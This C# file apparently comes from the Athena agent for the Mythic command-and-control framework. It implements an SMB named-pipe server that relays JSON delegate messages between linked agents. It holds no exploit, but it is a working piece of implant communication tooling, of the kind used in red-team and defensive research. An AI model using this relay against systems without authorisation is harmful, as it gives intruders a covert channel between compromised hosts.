using Athena.Mythic.Model.Response;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class SmbServer
    {
        public NamedPipeServerStream pipe { get; set; }
        public string namedpipe { get; set; }
        public CancellationTokenSource cancellationTokenSource { get; set; }

        public SmbServer()
        {
            this.namedpipe = "testpipe";
            this.cancellationTokenSource = new CancellationTokenSource();
            Globals.delegateMessages = new List<DelegateMessage>();
            Start(this.namedpipe);
        }


        //Should be able to implement these as agent jobs.
        //Return an error message if the SMB Server is not enabled.
        public void Start(string name)
        {
            Task.Run(() =>
            {
                while (true)
                {
                    this.pipe = new NamedPipeServerStream(this.namedpipe);

                    // Wait for a client to connect
                    pipe.WaitForConnection();
                    try
                    {
                        // Read user input and send that to the client process.
                        using (BinaryWriter _bw = new BinaryWriter(pipe))
                        using (BinaryReader _br = new BinaryReader(pipe))
                        {
                            while (true)
                            {
                                if (this.cancellationTokenSource.IsCancellationRequested)
                                {
                                    return;
                                }

                                //Listen for Something
                                var len = _br.ReadUInt32();
                                var temp = new string(_br.ReadChars((int)len));

                                //Add message to delegateMessages list
                                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(temp);
                                Globals.delegateMessages.Add(dm);
                                
                                //Wait for us to have a message to send.
                                while (Globals.outMessages.Count == 0) ;

                                //Pass to Main comms method
                                DelegateMessage msg = new DelegateMessage();
                                //Wait for us to actually be able to read from the delegate list
                                while (!Globals.outMessages.TryTake(out msg)) ;
                                var buf = Encoding.ASCII.GetBytes(msg.message);
                                _bw.Write((uint)buf.Length);
                                _bw.Write(buf);

                                //Clear out send message queue, is this necessary now that I'm using TryTake?
                                //Globals.outMessages.Clear();

                            }
                        }
                    }
                    // Catch the IOException that is raised if the pipe is broken
                    // or disconnected.
                    catch (IOException e)
                    {
                        Globals.outMessages.Clear();
                    }
                }
            },this.cancellationTokenSource.Token);
        }

        public void Stop()
        {
            this.cancellationTokenSource.Cancel();
        }
    }
}
